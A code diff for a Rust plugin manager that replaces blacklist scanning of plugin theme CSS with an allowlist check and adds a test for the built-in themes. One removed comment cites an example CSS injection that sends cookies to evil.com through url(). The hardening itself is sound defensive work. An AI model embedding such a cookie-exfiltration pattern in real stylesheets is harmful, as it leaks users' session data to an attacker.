@@ -316,6 +316,10 @@ impl PluginManager {
     let mut aggregated_css = String::new();
     for wasm_bytes in wasm_modules {
       if let Ok(css) = self.call_with_string(wasm_bytes, "get_theme_css", "").await {
+        if let Err(reason) = plugin_security::check_theme_css(&css) {
+          tracing::warn!(target: "plugin_security", %reason, "theme CSS rejected");
+          continue;
+        }
         aggregated_css.push_str(&css);
         aggregated_css.push('\n');
       }
@@ -351,16 +355,13 @@ impl PluginManager {
 
       // 缓存未命中 / mtime 不一致 → 调插件 + 写回 cache
       if let Ok(css) = self.call_path_with_string(path, "get_theme_css", "").await {
-        // Phase 9.2 / S8: theme CSS 黑名单扫描（规范化后匹配，对抗转义/空白/
-        // 注释混淆）。命中 pattern 整段跳过 + warn（fail-closed）。
-        // 防 CSS 注入做数据外渗（`url(http://evil.com/?cookie=...)` 之类）。
-        let hits = plugin_security::sanitize_theme_css(&css);
-        if !hits.is_empty() {
+        // SEC-08：白名单检查，不通过整段跳过 + warn（fail-closed）。
+        if let Err(reason) = plugin_security::check_theme_css(&css) {
           tracing::warn!(
             target: "plugin_security",
             plugin = %path.display(),
-            patterns = ?hits,
-            "theme CSS rejected: matched blacklist patterns"
+            %reason,
+            "theme CSS rejected"
           );
           continue;
         }
@@ -602,6 +603,21 @@ mod tests {
 
     let css = manager.aggregate_theme_css(&[wasm_bytes]).await;
     assert!(css.contains("--primary:"));
+  }
+
+  /// SEC-08：内置主题的输出必须通过白名单（被拒时页面会静默失去主题样式）。
+  #[tokio::test]
+  async fn builtin_theme_css_passes_the_allowlist() {
+    let manager = PluginManager::new();
+    for name in ["ocean", "sunset", "catppuccin"] {
+      let path = PathBuf::from(format!("../../assets/plugins/theme_{name}_plugin.wasm"));
+      if !path.exists() {
+        continue;
+      }
+      let css =
+        manager.call_path_with_string(&path, "get_theme_css", "").await.expect("call theme");
+      assert_eq!(plugin_security::check_theme_css(&css), Ok(()), "theme {name}");
+    }
   }
 
   /// 实际调用插件验证 cache hit：同一路径调用 N 次仅产生 1 个缓存条目。
